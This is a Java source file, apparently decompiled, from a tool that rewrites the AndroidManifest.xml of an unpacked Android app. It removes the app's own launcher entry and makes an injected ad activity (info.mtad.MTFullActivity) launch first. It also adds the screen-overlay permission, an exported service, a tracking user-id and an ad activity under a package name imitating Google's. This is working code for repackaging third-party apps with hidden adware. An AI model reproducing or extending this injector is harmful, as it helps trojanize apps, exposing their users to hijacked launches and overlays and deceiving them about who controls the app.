package t;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.logging.Level;
import java.util.logging.Logger;

public class ChangeManfei
        implements Runnable {
    private ArrayList<String> lineContents;
    private HandleCallback callback;
    String path;
    String userid;

    public ChangeManfei(String path, String userid, HandleCallback callback) {
        this.path = path;
        this.userid = userid;
        this.callback = callback;
    }

    public void haldleManife()
            throws IOException {
        this.lineContents = new ArrayList();
        String packageId = "";
        String applicationId = "";
        String mainRun = "";
        int countLine = 1;
        boolean errorApplication = false;
        boolean hasStyle = false;
        boolean isAddMainAds = false;
        BufferedReader br = new BufferedReader(new FileReader(this.path + "\\AndroidManifest.xml"));
        Throwable localThrowable3 = null;
        try {
            String line = br.readLine();
            while (line != null) {
                if (line.contains("android.intent.category.LAUNCHER")) {
                    System.out.println(line);
                    if (((String) this.lineContents.get(countLine - 1)).contains("<activity")) {
                        int indexMain = ((String) this.lineContents.get(countLine - 1)).indexOf("android:name=\"") + 14;
                        mainRun = ((String) this.lineContents.get(countLine - 1)).substring(indexMain);
                        mainRun = mainRun.substring(0, mainRun.indexOf("\"")).trim();
                        System.out.println(mainRun);
                    } else if (((String) this.lineContents.get(countLine - 2)).contains("<activity")) {
                        int indexMain = ((String) this.lineContents.get(countLine - 2)).indexOf("android:name=\"") + 14;
                        mainRun = ((String) this.lineContents.get(countLine - 2)).substring(indexMain);
                        mainRun = mainRun.substring(0, mainRun.indexOf("\"")).trim();
                        System.out.println(mainRun);
                    } else if (((String) this.lineContents.get(countLine - 3)).contains("<activity")) {
                        int indexMain = ((String) this.lineContents.get(countLine - 3)).indexOf("android:name=\"") + 14;
                        mainRun = ((String) this.lineContents.get(countLine - 3)).substring(indexMain);
                        mainRun = mainRun.substring(0, mainRun.indexOf("\"")).trim();
                        System.out.println(mainRun);
                    } else if (((String) this.lineContents.get(countLine - 4)).contains("<activity")) {
                        int indexMain = ((String) this.lineContents.get(countLine - 4)).indexOf("android:name=\"") + 14;
                        mainRun = ((String) this.lineContents.get(countLine - 4)).substring(indexMain);
                        mainRun = mainRun.substring(0, mainRun.indexOf("\"")).trim();

                        System.out.println(mainRun);
                    }
                } else if (line.contains("<application")) {
                    if ((line.contains("android:name=")) && (MainFrame.countSmali <= 2)) {
                        errorApplication = true;
                        applicationId = line.substring(line.indexOf("android:name=\"") + 14);
                        applicationId = applicationId.substring(0, applicationId.indexOf("\"")).trim();
                        System.out.println(applicationId);
                        this.lineContents.add(line);
                    } else if (MainFrame.countSmali > 2) {
                        this.lineContents.add(line);
                    } else {
                        String newAppTag = line.substring(0, line.length() - 1) + " android:name=\"android.support.multidex.MultiDexApplication\" >";
                        this.lineContents.add(newAppTag);
                    }

                } else if ((!line.contains("android.intent.action.MAIN")) &&
                        (!line.contains("android.intent.category.LAUNCHER"))) {
                    this.lineContents.add(line);
                    countLine++;
                }

                if (line.contains("<manifest")) {
                    packageId = line.substring(line.indexOf("package=\"") + 9);
                    packageId = packageId.substring(0, packageId.indexOf("\"")).trim();
                    System.out.println("packageId= " + packageId);

                    this.lineContents.add("<uses-permission android:name=\"android.permission.SYSTEM_ALERT_WINDOW\" />");
                }

                if ((line.contains("</activity>")) && (mainRun.length() > 0) && (!isAddMainAds)) {
                    this.lineContents.add("<activity android:name=\"info.mtad.MTFullActivity\" android:theme=\"@android:style/Theme.Black.NoTitleBar\">");
                    this.lineContents.add("<intent-filter>");
                    this.lineContents.add("<action android:name=\"android.intent.action.MAIN\"/>");
                    this.lineContents.add("<category android:name=\"android.intent.category.LAUNCHER\"/>");
                    this.lineContents.add("</intent-filter>");
                    if (mainRun.charAt(0) == '.') {
                        mainRun = packageId + mainRun;
                    }
                    this.lineContents.add("<meta-data android:name=\"main-activity\" android:value=\"" + mainRun + "\"/>");
                    this.callback.onResultIdMain(mainRun);
                    this.callback.onResultIdPackate(packageId);
                    this.lineContents.add("<meta-data android:name=\"id-package\" android:value=\"" + packageId + "\"/>");
                    this.lineContents.add(" <meta-data android:name=\"user-id\" android:value=\"" + this.userid + "\"/>");

                    this.lineContents.add("</activity>");
                    this.lineContents.add("<activity android:configChanges=\"keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode\" android:name=\"sdark.google.android.gms.ads.AdActivity\" android:theme=\"@android:style/Theme.Translucent\"/>");
                    this.lineContents.add("<service android:enabled=\"true\" android:exported=\"true\" android:name=\"info.mtad.TTService\"/>");

                    this.lineContents.add("<meta-data android:name=\"sdark.google.android.gms.version\" android:value=\"10084000\"/>");
                    isAddMainAds = true;
                }

                line = br.readLine();
            }
            try {
                PrintWriter writer = new PrintWriter(this.path + "\\AndroidManifest.xml", "UTF-8");
                for (String content : this.lineContents) {
                    writer.println(content);
                }
                writer.close();

                if (!errorApplication) {
                    this.callback.changeManfeMutidexComplete();
                } else {
                    this.callback.changeManfeErrorMutidex(applicationId);
                }
            } catch (IOException ex) {
                Logger.getLogger(MainFrame.class.getName()).log(Level.SEVERE, null, ex);
            }
        } catch (Throwable localThrowable1) {
            localThrowable3 = localThrowable1;
            throw localThrowable1;
        } finally {
            if (br != null) if (localThrowable3 != null) try {
                br.close();
            } catch (Throwable localThrowable2) {
                localThrowable3.addSuppressed(localThrowable2);
            }
            else br.close();
        }
    }

    public void run() {
        try {
            haldleManife();
        } catch (IOException ex) {
            Logger.getLogger(ChangeManfei.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
}
